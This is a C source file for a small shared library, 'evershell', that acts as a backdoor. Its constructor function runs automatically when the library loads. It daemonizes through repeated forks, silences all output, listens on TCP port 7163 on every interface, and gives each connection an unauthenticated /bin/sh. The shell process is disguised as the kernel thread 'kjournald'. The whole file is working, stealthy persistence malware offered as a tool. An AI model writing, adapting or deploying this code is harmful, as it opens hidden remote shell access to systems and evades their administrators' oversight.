/*
 * evershell.c
 * Little library to spawn a shell
 * By J. Stuart McMurray
 * Created 20190109
 * Last Modified 20190109
 */

#include <sys/socket.h>
#include <sys/wait.h>

#include <netinet/in.h>

#include <err.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>

#define PORT 7163             /* Listen port */
#define SHELLNAME "kjournald" /* Shell argv[0] */

void handle(int lfd, int cfd);

__attribute__((constructor)) void
evershell(void)
{
        pid_t pid;
        int i, fd;
        int cfd, lfd;
        socklen_t al;
        struct sockaddr_in sa;
        int enable;

        /* First of two forks */
        switch (pid = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        return;
                default: /* Parent */
                        /* Wait on the child and we're done */
                        waitpid(pid, NULL, 0);
                        return;
        }
        /* In middle child */


        /* Close all output */
        for (i = 0; i <= 1024; ++i)
                close(i);
        if (-1 != (fd = open("/dev/null", O_RDWR))) {
                dup2(STDIN_FILENO, fd);
                dup2(STDOUT_FILENO, fd);
                dup2(STDERR_FILENO, fd);
                if (fd != STDIN_FILENO && fd != STDOUT_FILENO &&
                                fd != STDERR_FILENO)
                        close(fd);
        }

        /* Disassociate from parent, and ignore child death */
        if (-1 == setsid())
                err(1, "setsid");
        if (SIG_ERR == signal(SIGCHLD, SIG_IGN))
                err(2, "signal");

        /* Fork the real process */
        switch (pid = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        err(3, "fork"); /* Shouldn't work */
                default: /* Parent */
                        /* Die, let the child do the work */
                        exit(0);
        }
        /* In the child */

        /* Disassociate from parent, and ignore child death */
        if (-1 == setsid())
                err(4, "setsid");
        if (SIG_ERR == signal(SIGCHLD, SIG_IGN))
                err(5, "signal");

        /* Listen for a TCP connection */
        bzero(&sa, sizeof(sa));
        sa.sin_port = htons(PORT);
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = INADDR_ANY;
        if (-1 == (lfd = socket(AF_INET, SOCK_STREAM, 0)))
                err(6, "socket");
        if (-1 == setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR,
                                &enable, sizeof(enable)))
                err(7, "setsockopt");
        if (-1 == bind(lfd, (struct sockaddr *)&sa, sizeof(sa)))
                err(8, "bind");
        if (-1 == listen(lfd, 10))
                err(9, "listen");

        /* Accept connections, hook up a shell */
        for (;;) {
                al = sizeof(sa);
                if (-1 == (cfd = accept(lfd, (struct sockaddr *)&sa, &al)))
                        err(10, "accept");
                handle(lfd, cfd);
                close(cfd);
        }
}


/*
 * handle handles a child connection on cfd, and closes the listening fd lfd.
 */
void
handle(int lfd, int cfd)
{
        pid_t pid; 
        int i;

        /* Another double-fork */
        switch (pid = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        warn("fork"); /* Shouldn't work */
                default: /* Parent */
                        /* Die, let the child do the work */
                        return;
        }

        /* Close the listener in the child */
        close(lfd);

        /* Disassociate from parent */
        if (-1 == setsid())
                err(11, "setsid");
        if (SIG_ERR == signal(SIGCHLD, SIG_IGN))
                err(5, "signal");

        /* Another double-fork */
        switch (pid = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        err(13, "fork"); /* Shouldn't work */
                default: /* Parent */
                        /* Die, let the child do the work */
                        exit(0);
        }

        /* Connect stdio to the network */
        dup2(cfd, STDIN_FILENO);
        dup2(cfd, STDOUT_FILENO);
        dup2(cfd, STDERR_FILENO);
        for (i = 3; i < 1024; i++)
                close(i);

        /* Spawn a shell */
        if (-1 == execl("/bin/sh", SHELLNAME, (char *)NULL))
                err(12, "execl");
}
